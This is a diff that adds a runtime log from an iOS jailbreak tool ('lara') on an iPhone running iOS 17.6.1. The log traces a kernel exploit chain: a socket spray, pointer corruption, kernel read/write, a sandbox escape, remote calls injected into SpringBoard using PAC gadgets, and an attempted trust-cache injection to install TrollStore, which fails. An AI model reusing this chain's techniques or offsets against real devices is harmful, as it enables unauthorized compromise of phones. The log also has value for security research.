@@ -1,0 +1,296 @@
+lara started: 2026-05-05 15:30:23
+(utils) TASK_TNEXT_OFFSET: 0x58
+(utils) THREAD_MUPCB_OFFSET: 0xb0
+(utils) PROC_PID_OFFSET: 0x28
+(offs) t1sz_boot: 0x19
+(offs) saved t1sz_boot: 0x19
+initialized offsets
+kernelcache not found, downloading automatically...
+libgrabkernel2: Found firmware URL: https://updates.cdn-apple.com/2024SummerFCS/fullrestores/062-57701/B292F1F4-1B75-43A8-9A41-DBF7FEDE1DBC/iPhone12,3,iPhone12,5_17.6.1_21G93_Restore.ipsw (OTA: no)
+(offs) loaded saved t1sz_boot: 0x19
+(offs) t1sz_boot: 0x19
+(offs) saved t1sz_boot: 0x19
+initialized offsets
+(ds) === DS_RUN() ENTRY POINT ===
+(ds) generating random markers...
+(ds) random_marker: 0x31aedbdbb9c36954
+(ds) wired_page_marker: 0xd3aeb775c5f2e26b
+(ds) allocating default_file_content (32768 bytes)...
+(ds) filling default_file_content with random marker...
+(ds) default_file_content prepared
+(ds) === CALLING PE() ===
+(ds) === PE() ENTRY POINT ===
+(ds) checking for stashed krw primitives...
+(ds) no stashed krw, starting fresh exploit
+(ds) === DEVICE INFO ===
+(ds) device: iPhone12,3
+(ds) ispac: yes
+(ds) detected non-A18 device - using standard exploit path
+(ds) calling pe_init()...
+(ds) read_fd: 0x14
+(ds) write_fd: 0x15
+(ds) executable_path: /private/var/containers/Bundle/Application/E0C86DBA-A200-44FF-BEF8-ACCAD906734B/lara.app/lara
+(ds) host_executable_path: /private/var/containers/Bundle/Application/E0C86DBA-A200-44FF-BEF8-ACCAD906734B/lara.app/lara
+(ds) guest_executable_name: lara
+(ds) host_executable_name: lara
+(ds) kernel_process_name: lara
+(ds) livecontainer_bundle: no
+(ds) livecontainer_guest: no
+(ds) rehosted_process: no
+(ds) process_marker[0]: lara
+(ds) executable_name: lara
+(ds) free_thread_arg: 0x152de4000
+(ds) calling pe_v1()...
+(ds) physical_mapping_address: 0x112380000
+(ds) pc_object: 0xa303
+(ds) pc_address: 0x3ba6ac000
+(ds) spraying 22528 sockets...
+(ds) socket_ports_count: 0x5800
+(ds) start_pcb_id: 0x8
+(ds) end_pcb_id: 0xb006
+(ds) looking in search mapping: 0 / 8 (0.00%)
+(ds) matched PCB via process marker: lara
+(ds) pcb_start_offset: 0x0
+(ds) target_inp_gencnt: 0x1376
+(ds) inp_list_next_pointer: 0xffffffe02473c400
+(ds) icmp6filter: 0xffffffe1f0413da0
+(ds) corrupting icmp6filter pointer...
+(ds) target corrupted: 0xffffffe02473c548
+(ds) found control_socket at idx: 0x9b7
+(ds) pe_v1() completed
+(utils) socket fallback: pcb=0xffffffe02473c400 pid=520
+(ds) exploit phase complete
+(ds) highest_success_idx: 381
+(ds) success_read_count: 43
+(ds) cleaning up threads...
+(ds) threads joined
+(ds) closing file descriptors...
+(utils) socket found via pcb+0x28 = 0xfffffff01775c7b0 (backptr at +0x0)
+(utils) socket scan found nothing (pcb=0xffffffe02473c400 sock=0xfffffff01775c7b0)
+(ds) file descriptors closed
+(ds) === WALKING KERNEL STRUCTURES ===
+(ds) reading control_socket_pcb...
+(ds) control_socket_pcb: 0xffffffe02473c000
+(ds) reading pcbinfo_pointer...
+(ds) pcbinfo_pointer: 0xfffffff017766ea8
+(ds) reading ipi_zone...
+(ds) ipi_zone: 0xfffffff014e4cfa0
+(ds) reading zv_name...
+(ds) zv_name: 0xfffffff01453e985
+(ds) === SEARCHING FOR KERNEL BASE ===
+(ds) initial kernel_base guess: 0xfffffff01453c000
+(ds) exploit success!
+(ds) kernel_base:  0xfffffff0144cc000
+(ds) kernel_slide: 0xd4c8000
+(ds) candidate Mach-O at 0xfffffff0144d4000: filetype=2 cpuinfo=0x2c0000002 (iter=26)
+(ds) found MH_EXECUTE fallback at 0xfffffff0144d4000
+(ds) candidate Mach-O at 0xfffffff0144cc000: filetype=12 cpuinfo=0xc00000002 (iter=28)
+(ds) ✓ found MH_FILESET header at 0xfffffff0144cc000
+(ds) === CALCULATING KERNEL SLIDE ===
+(ds) detected Intel/A-series chip
+(ds) ✓ kernel_base:  0xfffffff0144cc000
+(ds) ✓ kernel_slide: 0xd4c8000
+(ds) calling krw_sockets_leak_forever()...
+(ds) iOS 17: using so_count offset 0x24c
+(ds) krw_sockets_leak_forever() completed
+(ds) === KERNEL R/W IS READY ===
+(ds) getting our_proc and our_task...
+(ds) ✓ our_proc: 0xffffffe024433298
+(ds) ✓ our_task: 0xffffffe0244339d8
+(ds) stashkrw not available, skipping launchd transfer
+(ds) === PE() SUCCESS ===
+(ds) darksword exploit completed successfully
+(ds) ✓ PE() SUCCESS
+(ds) cleaning up default_file_content...
+(ds) === DS_RUN() COMPLETE (result=0) ===
+
+(ds) exploit success!
+(ds) kernel_base:  0xfffffff0144cc000
+(ds) kernel_slide: 0xd4c8000
+
+(sbx) proc=0xffffffe024433298 proc_ro_raw=0xffffffde09617000 proc_ro=0xffffffde09617000
+(sbx) scanning proc_ro for ucred...
+(sbx)   proc_ro+0x10: raw=0x208 smr=0x208 pac=0x208
+(sbx)   proc_ro+0x18: raw=0x22002305000005a1 smr=0x5000005a1 pac=0x5000005a1
+(sbx)   proc_ro+0x20: raw=0xffffffde56256500 smr=0xffffffde56256500 pac=0xffffffde56256500
+(sbx) found ucred at proc_ro+0x20 (SMR) = 0xffffffde56256500
+(sbx) ucred=0xffffffde56256500 label=0xffffffde096f9800 sandbox=0xffffffde5617ab08 ext_set=0xffffffe108873040
+(sbx) patched 5 extensions
+(sbx) changed 3 extension classes
+(sbx) filled 11 empty hash slots
+(sbx) escaped!
+
+sandbox escape ready!
+
+libgrabkernel2: Downloading BuildManifest.plist...
+libgrabkernel2: Downloading kernelcache.release.iphone12 to /var/mobile/Containers/Data/Application/B4C1A253-EAA2-453B-88AC-B568953D4240/Documents/kernelcache...
+T
+initializing remote call on SpringBoard...
+(rc) process: SpringBoard, pid: 35
+(rc) firstExceptionPort: 0x59030f, secondExceptionPort: 0x59040b
+(rc) [iter 0] kstack=0xffffffe7f5713f30 kernelSP=0xffffffe7f5713880
+(rc) [iter 0] Found TRO at offset=0x39c8
+(rc) [iter 0] checkVal=0x104e checkVal2=0x0 (expecting 0x104e)
+(rc) [iter 0] TRO swap: writing target tro=0xffffffde09683400 to addr=0xffffffe7f57139c8
+(rc) TRO swap SUCCESS!
+(rc) set_exception_port_on_thread returning success=1
+(rc) Inject EXC_GUARD on thread:0xffffffdf3c7910c0 OK
+(rc) Valid threads: 1
+(rc) Injected threads: 1
+(rc) Finish clearing EXC_GUARD from all other threads...
+libgrabkernel2: Downloaded kernelcache!
+kernel: Darwin Kernel Version 23.6.0: Fri Jul  5 18:04:32 PDT 2024; root:xnu-10063.142.1~1/RELEASE_ARM64_T8030
+kernbase: 0xfffffff007004000
+kernentry: 0xfffffff007d4c4f0
+kernproc: 0x978050
+rootvnode: 0x329b3d0
+procsize: 0x740
+✓ kernelcache downloaded successfully
+(rc) trojanMemTemp: 0x16d61a1a0
+(rc) vmMap: 0xffffffdd22f6be60
+(pac) found pacia gadget, gadget addr = 0x1a0ebf2a0
+(pac) remote_pac: addr=0x101 mod=0x74810000e6000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xc35fa90000000101
+(pac) remote_pac: addr=0x201 mod=0x77d30000e6000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x6969100000000201
+(rc) pcAddr for getpid: 0x1eaf8abec
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1eaf8abec mod=0x74810000da000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x2754101eaf8abec
+(pac) remote_pac: addr=0x201 mod=0x77d30000da000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x181af18000000201
+(rc) getpid func's retValue = 0x23(35)
+(pac) remote_pac: addr=0x301 mod=0x0 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xc156ab8000000301
+(rc) remoteCrashSigned: 0xc156ab8000000301
+(rc) pcAddr for pthread_create_suspended_np: 0x1fed8559c
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1fed8559c mod=0x7481000048000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xf9349981fed8559c
+(pac) remote_pac: addr=0x201 mod=0x77d3000048000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x1f626b8000000201
+(rc) pthread_create_suspended_np func's retValue = 0x0(0)
+(rc) trojanMemTemp: 0x16d61a1a0
+(rc) pthreadAddr: 0x16d733000
+(rc) pcAddr for pthread_mach_thread_np: 0x1fed7d620
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1fed7d620 mod=0x7481000024000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x6b3c3781fed7d620
+(pac) remote_pac: addr=0x201 mod=0x77d3000024000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xb0fe00000000201
+(rc) pthread_mach_thread_np func's retValue = 0x75b4b(482123)
+(rc) callThreadPort: 0x75b4b
+(rc) [iter 0] kstack=0xffffffe7f54bbf30 kernelSP=0xffffffe7f54bb880
+(rc) [iter 0] Found TRO at offset=0x39c8
+(rc) [iter 0] checkVal=0x104e checkVal2=0x0 (expecting 0x104e)
+(rc) [iter 0] TRO swap: writing target tro=0xffffffde0965bd60 to addr=0xffffffe7f54bb9c8
+(rc) TRO swap SUCCESS!
+(rc) set_exception_port_on_thread returning success=1
+(rc) All good! Resuming trojan thread...
+(rc) pcAddr for thread_resume: 0x1eaf86ab4
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1eaf86ab4 mod=0x7481000025000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xb77ef181eaf86ab4
+(pac) remote_pac: addr=0x201 mod=0x77d3000025000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x5c1ecd8000000201
+(rc) thread_resume func's retValue = 0x0(0)
+(rc) New thread created, resuming original
+(pac) remote_pac: addr=0xed42e181eaf856c8 mod=0x7481000012000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x741afe01eaf856c8
+(pac) remote_pac: addr=0xc7648d01eaf88ec8 mod=0x77d3000012000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xa502e681eaf88ec8
+(rc) Original thread restored
+(rc) pcAddr for getpid: 0x1eaf8abec
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1eaf8abec mod=0x7481000061000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x9772a581eaf8abec
+(pac) remote_pac: addr=0x401 mod=0x77d3000061000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x4f7dfa8000000401
+(rc) getpid func's retValue = 0x23(35)
+(rc) Task pid: 35
+(rc) pcAddr for mmap: 0x1eaf8b820
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1eaf8b820 mod=0x7481000089000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xf8750a01eaf8b820
+(pac) remote_pac: addr=0x401 mod=0x77d3000089000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x8775388000000401
+(rc) mmap func's retValue = 0xd1200c000(56136613888)
+(rc) pcAddr for memset: 0x1fecc73e0
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1fecc73e0 mod=0x74810000c9000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x523f2481fecc73e0
+(pac) remote_pac: addr=0x401 mod=0x77d30000c9000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xd2480f8000000401
+(rc) memset func's retValue = 0xd1200c000(56136613888)
+(rc) Finished successfully
+(rc) pcAddr for getpid: 0x1eaf8abec
+(rc) Waiting for exception...
+(rc) Exception received, setting up args and replying
+(pac) remote_pac: addr=0x1eaf8abec mod=0x7481000017000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0xe0670601eaf8abec
+(pac) remote_pac: addr=0x401 mod=0x77d3000017000000 gadget=0x1a0ebf2a0
+(pac) PAC thread state set, swapping keys and resuming
+(pac) remote_pac result: 0x75178f0000000401
+(rc) getpid func's retValue = 0x23(35)
+remote call initialized on SpringBoard
+rc init succeeded!
+remote getpid() returned: 35
+CRITICAL: installTrollStore() called
+CRITICAL: canInstall = true, proceeding
+=== TrollStore Installation Started ===
+Device: iPhone
+iOS: 17.6.1
+Time: 05.05.2026, 15:30
+CRITICAL: Logs are being saved to Documents folder
+CRITICAL: Check Files app -> On My iPhone -> lara
+=== STEP 1: VERIFY DARKSWORD ===
+CRITICAL: Checking DarkSword status...
+CRITICAL: mgr.dsready = true
+✓ DarkSword is ready
+CRITICAL: kernel_base = 0xfffffff0144cc000
+CRITICAL: kernel_slide = 0xd4c8000
+CRITICAL: Waiting 0.5s before AMFI bypass...
+=== STEP 2: TRUST CACHE INJECTION ===
+Note: Using trust cache injection instead of AMFI bypass
+This is more stable and doesn't cause kernel panic
+Initializing trust cache injection...
+✓ Trust cache injection initialized
+=== STEP 3: TROLLSTORE DOWNLOAD ===
+Downloading TrollStore IPA...
+Will inject CDHash into trust cache after download
+Downloading TrollStore from: https://github.com/opa334/TrollStore/releases/latest/download/TrollStore.ipa
+Download started...
+✓ TrollStore downloaded successfully
+File size: 9 bytes
+✓ TrollStore saved to: /var/mobile/Containers/Data/Application/B4C1A253-EAA2-453B-88AC-B568953D4240/Documents/TrollStore.ipa
+=== Extracting TrollStore Binary ===
+⚠ Trust cache injection failed: -10
+You can still try manual installation
+Check trust_cache_debug.log for error details
